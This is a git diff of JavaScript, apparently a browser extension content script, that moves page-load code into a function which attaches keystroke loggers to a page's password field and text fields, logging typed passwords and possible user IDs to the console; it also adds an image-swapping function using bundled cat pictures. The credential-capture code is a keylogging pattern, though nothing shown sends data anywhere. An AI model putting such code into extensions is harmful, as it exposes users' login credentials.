@@ -1,21 +1,7 @@
-swindow.onload = function() {
-    const passwordEl = document.querySelectorAll('input[type="password"]')[0];
-    const possibleUserIdEls = document.querySelectorAll('input[type="text"]');
-    
-    const keyStrokeTimeOut = 1500;
-    if (passwordEl) {
-        inputLogger(passwordEl, "password", keyStrokeTimeOut, onDoneTyping);
-    }
-
-    if (possibleUserIdEls) {
-        if (possibleUserIdEls) {
-            possibleUserIdEls?.forEach(idEl => {
-                inputLogger(idEl, "possibleUserId", keyStrokeTimeOut, onDoneTyping);
-            });
-        }
-    }
-
-}
+window.onload = () => {
+    readUserInput();
+    // replacePics();
+};
 
 const inputLogger = (inputEl, elName, typingInterval, onDoneTyping, observer) => {
     let typingTimer;
@@ -37,6 +23,37 @@ const inputLogger = (inputEl, elName, typingInterval, onDoneTyping, observer) =>
 const onDoneTyping = (input, elName) => {
     debugger;
     console.log(EL_NAMES.elName + ": " + input);
+};
+
+const readUserInput = () => {
+    const passwordEl = document.querySelectorAll('input[type="password"]')[0];
+    const possibleUserIdEls = document.querySelectorAll('input[type="text"]');
+    
+    const keyStrokeTimeOut = 1500;
+    if (passwordEl) {
+        inputLogger(passwordEl, "password", keyStrokeTimeOut, onDoneTyping);
+    }
+
+    if (possibleUserIdEls) {
+        if (possibleUserIdEls) {
+            possibleUserIdEls?.forEach(idEl => {
+                inputLogger(idEl, "possibleUserId", keyStrokeTimeOut, onDoneTyping);
+            });
+        }
+    }
+};
+
+const replacePics = () => {
+    const imgEls = document.querySelectorAll('img');
+    const min = 1;
+    const max = 3;
+
+    imgEls?.forEach(el => {
+        const index = Math.floor(Math.random() * (max - min) + min);
+        const fileName = imageFileNames = 'images/cat_img_' + String(index) + '.jpg';
+        const imgUrl = chrome.extension.getURL(fileName);
+        el.src = imgUrl;
+    });
 };
 
 
